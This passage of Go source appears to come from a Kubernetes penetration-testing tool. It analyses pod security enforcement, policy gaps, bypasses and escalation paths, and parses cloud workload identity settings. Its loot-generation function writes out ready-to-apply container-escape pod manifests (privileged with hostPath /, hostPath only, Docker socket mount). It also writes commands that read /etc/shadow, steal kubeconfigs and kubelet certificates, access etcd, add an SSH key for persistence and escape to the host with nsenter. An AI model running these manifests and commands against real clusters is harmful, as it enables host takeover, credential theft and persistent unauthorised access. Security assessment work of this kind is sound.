			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostPath - check name and JS code
		if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
			(strings.Contains(jsCode, "volumes") && strings.Contains(jsCode, "hostpath")) {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostNetwork - check name and JS code
		if strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") ||
			strings.Contains(jsCode, "hostnetwork") {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostPID - check name and JS code
		if strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") ||
			strings.Contains(combined, "hostnamespace") || strings.Contains(jsCode, "hostpid") {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostIPC - check name and JS code
		if strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") ||
			strings.Contains(combined, "hostnamespace") || strings.Contains(jsCode, "hostipc") {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// Capabilities - check name and JS code
		if strings.Contains(combined, "capabilities") ||
			(strings.Contains(jsCode, "securitycontext") && strings.Contains(jsCode, "capabilities")) {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// RunAsNonRoot - check name and JS code
		if strings.Contains(combined, "runasnonroot") || strings.Contains(combined, "run-as-non-root") ||
			strings.Contains(jsCode, "runasnonroot") || strings.Contains(jsCode, "runasuser") {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}
	}

	// Check Polaris - use specific check configuration from ConfigMap
	// Polaris checks: https://polaris.docs.fairwinds.com/checks/security/
	if polarisConfig.WebhookEnabled {
		// Only mark as blocked if the specific check is enabled
		if polarisConfig.PrivilegedCheckEnabled {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, "Polaris:privilegedContainers")
		}
		if polarisConfig.HostNetworkCheckEnabled {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, "Polaris:hostNetworkSet")
		}
		if polarisConfig.HostPIDCheckEnabled {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, "Polaris:hostPIDSet")
		}
		if polarisConfig.HostIPCCheckEnabled {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, "Polaris:hostIPCSet")
		}
		if polarisConfig.CapabilitiesCheckEnabled {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, "Polaris:dangerousCapabilities")
		}
		if polarisConfig.RunAsRootCheckEnabled {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, "Polaris:runAsRootAllowed")
		}
		if polarisConfig.HostPathCheckEnabled {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, "Polaris:hostPath")
		}
	}

	// Check Datree - use specific check configuration from ConfigMap
	// Datree default rules: https://hub.datree.io/built-in-rules
	if datreeConfig.WebhookEnabled {
		// Only mark as blocked if the specific check is enabled
		if datreeConfig.PrivilegedCheckEnabled {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, "Datree:CONTAINERS_INCORRECT_PRIVILEGED_VALUE_TRUE")
		}
		if datreeConfig.HostNetworkCheckEnabled {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTNETWORK_VALUE_TRUE")
		}
		if datreeConfig.HostPIDCheckEnabled {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTPID_VALUE_TRUE")
		}
		if datreeConfig.HostIPCCheckEnabled {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTIPC_VALUE_TRUE")
		}
		if datreeConfig.CapabilitiesCheckEnabled {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, "Datree:CONTAINERS_INCORRECT_CAPABILITIES")
		}
		if datreeConfig.RunAsRootCheckEnabled {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, "Datree:CONTAINERS_INCORRECT_RUNASNONROOT_VALUE")
		}
		if datreeConfig.HostPathCheckEnabled {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTPATH_MOUNT")
		}
	}

	return blocking
}

// detectPolicyGaps detects missing or incomplete policy enforcement
func detectPolicyGaps(finding PodSecurityFinding) []string {
	var gaps []string

	if finding.NoEnforcement {
		gaps = append(gaps, "No pod security enforcement configured")
	}

	if finding.WeakEnforcement {
		gaps = append(gaps, "Weak enforcement (privileged level allows all configurations)")
	}

	if !finding.PSSEnabled && !finding.PSPEnabled && finding.WebhookCount == 0 && finding.PolicyEngineCount == 0 {
		gaps = append(gaps, "No pod security controls of any kind")
	}

	if finding.PSSEnforceLevel == "" && finding.PSSWarnLevel == "" && finding.PSSAuditLevel == "" {
		gaps = append(gaps, "No PSS labels configured (enforce/warn/audit)")
	}

	if finding.PSSEnforceLevel == "" && finding.PSSWarnLevel != "" {
		gaps = append(gaps, "PSS warn mode only - pods not blocked")
	}

	return gaps
}

// detectPolicyConflicts detects conflicting policy configurations
func detectPolicyConflicts(finding PodSecurityFinding) []string {
	var conflicts []string

	// PSS + PSP conflict
	if finding.PSSEnabled && finding.PSPEnabled {
		conflicts = append(conflicts, "Both PSS and PSP enabled - PSP is deprecated, prefer PSS")
	}

	// Multiple policy engines
	if finding.PolicyEngineCount > 1 {
		conflicts = append(conflicts, fmt.Sprintf("Multiple policy engines (%d) - may have overlapping rules", finding.PolicyEngineCount))
	}

	// PSS privileged with webhooks
	if finding.PSSEnforceLevel == "privileged" && finding.WebhookCount > 0 {
		conflicts = append(conflicts, "PSS privileged level with webhooks - PSS allows all, webhooks may try to restrict")
	}

	return conflicts
}

// detectPolicyBypass detects policy bypass techniques
func detectPolicyBypass(finding PodSecurityFinding) []string {
	var bypasses []string

	if finding.NoEnforcement {
		bypasses = append(bypasses, "No enforcement - deploy any pod configuration")
	}

	if finding.PSSEnforceLevel == "privileged" {
		bypasses = append(bypasses, "PSS privileged level - effectively no restrictions")
	}

	if finding.WebhookBypassRisk == "HIGH" {
		bypasses = append(bypasses, "Webhook has 'Ignore' failure policy - trigger failure to bypass")
	}

	if finding.PSPEnabled {
		bypasses = append(bypasses, "PSP can be bypassed by using unbound service accounts")
	}

	return bypasses
}

// detectPolicyEscalationPaths detects privilege escalation via policy misconfig
func detectPolicyEscalationPaths(finding PodSecurityFinding, pspAnalyses []PSPAnalysis) []string {
	var paths []string

	if finding.NoEnforcement {
		paths = append(paths, "No enforcement → deploy privileged pod → container escape")
	}

	if finding.PSSEnforceLevel == "privileged" {
		paths = append(paths, "PSS privileged level → deploy pod with dangerous capabilities → escalate")
	}

	for _, psp := range pspAnalyses {
		if psp.AllowsPrivileged {
			paths = append(paths, fmt.Sprintf("PSP %s allows privileged → container escape", psp.Name))
		}
		if len(psp.AllowedCapabilities) > 0 {
			paths = append(paths, fmt.Sprintf("PSP %s allows dangerous capabilities → capability abuse", psp.Name))
		}
		if psp.AllowsHostPath {
			paths = append(paths, fmt.Sprintf("PSP %s allows hostPath → host filesystem access", psp.Name))
		}
	}

	return paths
}

// calculatePolicyRiskScore calculates policy configuration risk score
func calculatePolicyRiskScore(finding PodSecurityFinding) (string, int) {
	score := 0

	// No enforcement = CRITICAL
	if finding.NoEnforcement {
		return shared.RiskCritical, 100
	}

	// PSS privileged level = CRITICAL
	if finding.PSSEnforceLevel == "privileged" {
		return shared.RiskCritical, 95
	}

	// PSP allows privileged
	if finding.PSPAllowsPrivileged {
		score += 80
	}

	// PSP dangerous capabilities
	if len(finding.PSPDangerousCaps) > 0 {
		score += 60
	}

	// PSP allows hostPath
	if finding.PSPAllowsHostPath {
		score += 50
	}

	// Webhook bypass risk
	if finding.WebhookBypassRisk == shared.RiskHigh {
		score += 40
	}

	// Weak enforcement (baseline)
	if finding.PSSEnforceLevel == "baseline" {
		score += 30
	}

	// Policy gaps
	score += len(finding.PolicyGaps) * 10

	// Policy conflicts
	score += len(finding.ConflictDetails) * 5

	// Bypass techniques
	score += len(finding.BypassTechniques) * 15

	// PSP deprecation risk
	if finding.PSPEnabled {
		score += 20
	}

	// Determine risk level
	if score >= shared.CriticalThreshold {
		return shared.RiskCritical, score
	} else if score >= shared.HighThreshold {
		return shared.RiskHigh, score
	} else if score >= shared.MediumThreshold {
		return shared.RiskMedium, score
	}
	return shared.RiskLow, score
}

// generatePolicyRecommendations generates policy security recommendations
func generatePolicyRecommendations(finding PodSecurityFinding) []string {
	var recommendations []string

	if finding.NoEnforcement {
		recommendations = append(recommendations,
			"CRITICAL: Enable Pod Security Standards with 'restricted' level",
			"kubectl label namespace "+finding.Namespace+" pod-security.kubernetes.io/enforce=restricted")
	}

	if finding.PSSEnforceLevel == "privileged" {
		recommendations = append(recommendations,
			"Upgrade PSS enforce level from 'privileged' to 'baseline' or 'restricted'")
	}

	if finding.PSSEnforceLevel == "baseline" {
		recommendations = append(recommendations,
			"Consider upgrading PSS enforce level from 'baseline' to 'restricted' for stronger security")
	}

	if finding.PSPEnabled {
		recommendations = append(recommendations,
			"Migrate from deprecated PSP to Pod Security Standards",
			"PSP will be removed in Kubernetes 1.25")
	}

	if finding.WebhookBypassRisk == "HIGH" {
		recommendations = append(recommendations,
			"Change webhook failurePolicy from 'Ignore' to 'Fail'",
			"Ensure webhook has proper monitoring and alerting")
	}

	if len(finding.ConflictDetails) > 0 {
		recommendations = append(recommendations,
			"Resolve policy conflicts (PSS/PSP/webhooks)",
			"Use single consistent policy framework")
	}

	if len(recommendations) == 0 {
		recommendations = append(recommendations, "Policy configuration is secure")
	}

	return recommendations
}

// generatePolicyLoot generates loot content organized by technology
func generatePolicyLoot(finding *PodSecurityFinding, loot *shared.LootBuilder) {
	// PSS section - enumeration and analysis
	loot.Section("PSS").Addf("\n# ─────────────────────────────────────────────────────────────")
	loot.Section("PSS").Addf("# Namespace: %s", finding.Namespace)
	loot.Section("PSS").Addf("# ─────────────────────────────────────────────────────────────")
	loot.Section("PSS").Addf("kubectl get ns %s --show-labels", finding.Namespace)
	loot.Section("PSS").Addf("kubectl get ns %s -o yaml", finding.Namespace)

	if finding.PSSEnabled {
		loot.Section("PSS").Add("#")
		loot.Section("PSS").Addf("# PSS Enforce: %s", finding.PSSEnforceLevel)
		if finding.PSSWarnLevel != "" {
			loot.Section("PSS").Addf("# PSS Warn: %s", finding.PSSWarnLevel)
		}
		if finding.PSSAuditLevel != "" {
			loot.Section("PSS").Addf("# PSS Audit: %s", finding.PSSAuditLevel)
		}
	}

	// Add bypass info for weak/no enforcement
	if finding.NoEnforcement {
		loot.Section("PSS").Add("#")
		loot.Section("PSS").Add("# [VULNERABLE] No PSS enforcement - accepts any pod configuration")
		loot.Section("PSS").Add("# See Privileged-Pods loot file for container escape pod")
	} else if finding.PSSEnforceLevel == "privileged" {
		loot.Section("PSS").Add("#")
		loot.Section("PSS").Add("# [VULNERABLE] PSS level 'privileged' - effectively no restrictions")
		loot.Section("PSS").Add("# See Privileged-Pods loot file for container escape pod")
	} else if finding.PSSEnforceLevel == "baseline" {
		loot.Section("PSS").Add("#")
		loot.Section("PSS").Add("# [MEDIUM] PSS level 'baseline' - allows some risky configs")
		loot.Section("PSS").Add("# Allowed: hostNetwork (with restrictions), hostPort, hostPath (no /), unsafe sysctls")
	}
	loot.Section("PSS").Add("")

	// Privileged-Pods section - ready-to-use escape pods
	if finding.NoEnforcement || finding.PSSEnforceLevel == "privileged" || finding.PSPAllowsPrivileged {
		loot.Section("Privileged-Pods").Addf("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Privileged-Pods").Addf("# Namespace: %s", finding.Namespace)
		loot.Section("Privileged-Pods").Addf("# ═══════════════════════════════════════════════════════════")

		if finding.NoEnforcement {
			loot.Section("Privileged-Pods").Add("# Status: NO ENFORCEMENT - accepts any pod")
		} else if finding.PSSEnforceLevel == "privileged" {
			loot.Section("Privileged-Pods").Add("# Status: PSS PRIVILEGED - allows all dangerous configs")
		} else if finding.PSPAllowsPrivileged {
			loot.Section("Privileged-Pods").Add("# Status: PSP ALLOWS PRIVILEGED")
		}

		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# OPTION 1: Full privileged pod with host filesystem")
		loot.Section("Privileged-Pods").Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-escape
  namespace: %s
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF`, finding.Namespace)

		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# OPTION 2: Minimal escape pod (hostPath only)")
		loot.Section("Privileged-Pods").Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
  namespace: %s
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF`, finding.Namespace)

		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# OPTION 3: Docker socket escape")
		loot.Section("Privileged-Pods").Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: docker-escape
  namespace: %s
spec:
  containers:
  - name: escape
    image: docker:cli
    command: ["sleep", "3600"]
    volumeMounts:
    - name: docker
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker
    hostPath:
      path: /var/run/docker.sock
EOF`, finding.Namespace)

		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Privileged-Pods").Add("# EXPLOITATION COMMANDS")
		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Exec into privileged pod:")
		loot.Section("Privileged-Pods").Addf("kubectl exec -it privileged-escape -n %s -- sh", finding.Namespace)
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Inside container - access host filesystem:")
		loot.Section("Privileged-Pods").Add("ls -la /host/")
		loot.Section("Privileged-Pods").Add("cat /host/etc/shadow")
		loot.Section("Privileged-Pods").Add("cat /host/etc/passwd")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Steal kubeconfig and certificates:")
		loot.Section("Privileged-Pods").Add("cat /host/etc/kubernetes/admin.conf")
		loot.Section("Privileged-Pods").Add("cat /host/var/lib/kubelet/kubeconfig")
		loot.Section("Privileged-Pods").Add("ls -la /host/var/lib/kubelet/pki/")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Access etcd data (all cluster secrets):")
		loot.Section("Privileged-Pods").Add("ls -la /host/var/lib/etcd/")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Container runtime escape:")
		loot.Section("Privileged-Pods").Add("ls -la /host/var/run/docker.sock")
		loot.Section("Privileged-Pods").Add("ls -la /host/var/run/containerd/containerd.sock")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Add SSH key for persistence:")
		loot.Section("Privileged-Pods").Add("mkdir -p /host/root/.ssh")
		loot.Section("Privileged-Pods").Add("echo 'ssh-rsa AAAA...your-key...' >> /host/root/.ssh/authorized_keys")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# Docker socket escape (if using docker-escape pod):")
		loot.Section("Privileged-Pods").Add("docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh")
		loot.Section("Privileged-Pods").Add("#")
		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Privileged-Pods").Add("# CLEANUP")
		loot.Section("Privileged-Pods").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Privileged-Pods").Addf("kubectl delete pod privileged-escape -n %s", finding.Namespace)
		loot.Section("Privileged-Pods").Addf("kubectl delete pod hostpath-escape -n %s", finding.Namespace)
		loot.Section("Privileged-Pods").Addf("kubectl delete pod docker-escape -n %s", finding.Namespace)
		loot.Section("Privileged-Pods").Add("")
	}
}

// formatDuration formats a duration into human-readable string
func podSecurityFormatDuration(d time.Duration) string {
	if d.Hours() > 24*365 {
		years := int(d.Hours() / 24 / 365)
		return fmt.Sprintf("%dy", years)
	}
	if d.Hours() > 24*30 {
		months := int(d.Hours() / 24 / 30)
		return fmt.Sprintf("%dmo", months)
	}
	if d.Hours() > 24 {
		days := int(d.Hours() / 24)
		return fmt.Sprintf("%dd", days)
	}
	if d.Hours() > 1 {
		hours := int(d.Hours())
		return fmt.Sprintf("%dh", hours)
	}
	if d.Minutes() > 1 {
		minutes := int(d.Minutes())
		return fmt.Sprintf("%dm", minutes)
	}
	return "< 1m"
}

// ============================================================================
// Cloud Workload Identity Analysis Functions
// ============================================================================

// analyzeAWSPodIdentity analyzes AWS EKS Pod Identity Associations
func analyzeAWSPodIdentity(ctx context.Context, dynClient dynamic.Interface) []AWSPodIdentityAssociation {
	var associations []AWSPodIdentityAssociation

	// PodIdentityAssociation CRD (EKS Pod Identity - newer)
	gvr := schema.GroupVersionResource{
		Group:    "eks.amazonaws.com",
		Version:  "v1alpha1",
		Resource: "podidentityassociations",
	}

	list, err := dynClient.Resource(gvr).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, item := range list.Items {
			assoc := AWSPodIdentityAssociation{}

			if metadata, ok := item.Object["metadata"].(map[string]interface{}); ok {
				assoc.Name, _ = metadata["name"].(string)
				assoc.Namespace, _ = metadata["namespace"].(string)
			}

			if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
				assoc.ServiceAccount, _ = spec["serviceAccount"].(string)
				assoc.RoleARN, _ = spec["roleArn"].(string)

				// Check for wildcard service account (security concern)
				if assoc.ServiceAccount == "*" {
					assoc.HasWildcard = true
				}
			}

			associations = append(associations, assoc)
		}
	}

	return associations
}

// analyzeGCPWorkloadIdentity analyzes GCP Workload Identity configurations
func analyzeGCPWorkloadIdentity(ctx context.Context, clientset kubernetes.Interface) []GCPWorkloadIdentityBinding {
	var bindings []GCPWorkloadIdentityBinding

	// GCP Workload Identity is configured via annotations on ServiceAccounts
	// Annotation: iam.gke.io/gcp-service-account
	saList, err := clientset.CoreV1().ServiceAccounts("").List(ctx, metav1.ListOptions{})
	if err != nil {
		return bindings
	}

	for _, sa := range saList.Items {
		if gcpSA, ok := sa.Annotations["iam.gke.io/gcp-service-account"]; ok {
			binding := GCPWorkloadIdentityBinding{
				Name:              sa.Name,
				Namespace:         sa.Namespace,
				KSAName:           sa.Name,
				GSAEmail:          gcpSA,
				AnnotationPresent: true,
			}
			bindings = append(bindings, binding)
		}
	}

	return bindings
}

// analyzeAzureWorkloadIdentity analyzes Azure Workload Identity configurations
func analyzeAzureWorkloadIdentity(ctx context.Context, dynClient dynamic.Interface) []AzureWorkloadIdentity {
	var identities []AzureWorkloadIdentity

	// AzureIdentity (AAD Pod Identity - legacy)
	gvr := schema.GroupVersionResource{
		Group:    "aadpodidentity.k8s.io",
		Version:  "v1",
		Resource: "azureidentities",
	}

	list, err := dynClient.Resource(gvr).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, item := range list.Items {
			identity := AzureWorkloadIdentity{
				Kind: "AzureIdentity",
			}

			if metadata, ok := item.Object["metadata"].(map[string]interface{}); ok {
				identity.Name, _ = metadata["name"].(string)
				identity.Namespace, _ = metadata["namespace"].(string)
			}

			if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
				identity.ClientID, _ = spec["clientID"].(string)
				identity.TenantID, _ = spec["tenantID"].(string)
			}

			identities = append(identities, identity)
		}
	}

	// AzureIdentityBinding (AAD Pod Identity - legacy)
	gvr2 := schema.GroupVersionResource{
		Group:    "aadpodidentity.k8s.io",
		Version:  "v1",
		Resource: "azureidentitybindings",
	}

	list2, err := dynClient.Resource(gvr2).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, item := range list2.Items {
			identity := AzureWorkloadIdentity{
				Kind: "AzureIdentityBinding",
			}

			if metadata, ok := item.Object["metadata"].(map[string]interface{}); ok {
				identity.Name, _ = metadata["name"].(string)
				identity.Namespace, _ = metadata["namespace"].(string)
			}

			if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
				identity.Selector, _ = spec["selector"].(string)
			}

			identities = append(identities, identity)
		}
	}

	return identities
}

// Filter functions for cloud workload identity by namespace

func filterAWSPodIdentitiesByNamespace(associations []AWSPodIdentityAssociation, namespace string) []AWSPodIdentityAssociation {
	var filtered []AWSPodIdentityAssociation
	for _, a := range associations {
		if a.Namespace == namespace {
			filtered = append(filtered, a)
		}
	}
	return filtered
}

func filterGCPWorkloadIdentitiesByNamespace(bindings []GCPWorkloadIdentityBinding, namespace string) []GCPWorkloadIdentityBinding {
	var filtered []GCPWorkloadIdentityBinding
	for _, b := range bindings {
		if b.Namespace == namespace {
			filtered = append(filtered, b)
		}
	}
	return filtered
}

func filterAzureWorkloadIdentitiesByNamespace(identities []AzureWorkloadIdentity, namespace string) []AzureWorkloadIdentity {
	var filtered []AzureWorkloadIdentity
	for _, i := range identities {
		if i.Namespace == namespace {
			filtered = append(filtered, i)
		}
	}
	return filtered
}
